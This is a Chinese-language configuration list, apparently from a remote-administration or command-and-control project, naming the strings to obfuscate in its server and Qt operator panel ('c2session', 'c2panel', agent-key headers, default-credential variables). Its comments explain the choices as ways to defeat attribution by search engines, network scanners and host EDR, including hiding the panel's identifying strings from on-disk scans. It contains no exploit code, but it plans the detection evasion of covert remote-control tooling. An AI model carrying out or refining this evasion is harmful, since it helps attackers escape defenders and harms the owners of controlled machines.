# 服务端/面板需要混淆的字面量清单
# 每行一个 UTF-8 字符串；# 开头为注释。
#
# 选取标准（只挑"一眼看出这是什么工具"的项）：
#   ① 自定义协议标识：自定义请求头名、cookie 名 —— 这是最硬的标识，
#      出现在网络流量与内存里，且独一无二，搜索引擎可直接归因
#   ② 专有名词：产品名、服务名、证书主体
#   ③ 会回给扫描器的固定响应：health 端点的 service/version 字段
#   ④ 命令行/环境变量名：暴露运维接口与默认口令路径
#
# 故意**不**放进来：
#   · "/api/..." 这类 URL 路径 —— 属于语义路由，且服务端与客户端两侧都要用，
#     混淆会带来"两侧必须同源"的耦合。它们的处理方式是路径前缀随机化
#     （见 server/main.go 的 routePrefix），那是运行期机制而非字符串混淆。
#   · 日志文案与中文注释 —— 不影响归因，且混淆后排查困难。

# ── ① 自定义协议标识（最高优先级）──
X-Agent-Key
X-Agent-HWID
c2session

# ── ② 专有名词 ──
r6m-server
RemoteIPv6Manager
r6m-server.exe
r6m-agent-key
r6m-cfg-

# ── ③ 固定响应字段 ──
r6m
r6m-server v1

# ── ④ 运维接口与默认口令相关 ──
RMM_PASS
RMM_USER
RMM_AGENT_KEY

# ── 面板侧（Qt/QML）──
# 面板在操作者自己的 Windows 上运行，是被"本机安全产品"看到的一方：
# 主机 EDR 会扫描 GUI 程序、窗口标题、进程名与磁盘上的二进制。
# 这里混淆的是"一眼看出这是什么工具"的标识串。
#
# 注意：窗口标题刻意**不混淆成无关内容** —— 操作者需要认得出自己的工具，
# 换成 "Windows Explorer" 之类反而在任务栏里更可疑（一个 Explorer 却带
# 远程截屏页签）。所以标题保持产品名，但把它从二进制明文里拿走：
# 由 C++ 运行期解密后经 context property 传给 QML。
RMM Panel
RMM Panel v2.0
RMMPanel
c2panel
远程管理控制台
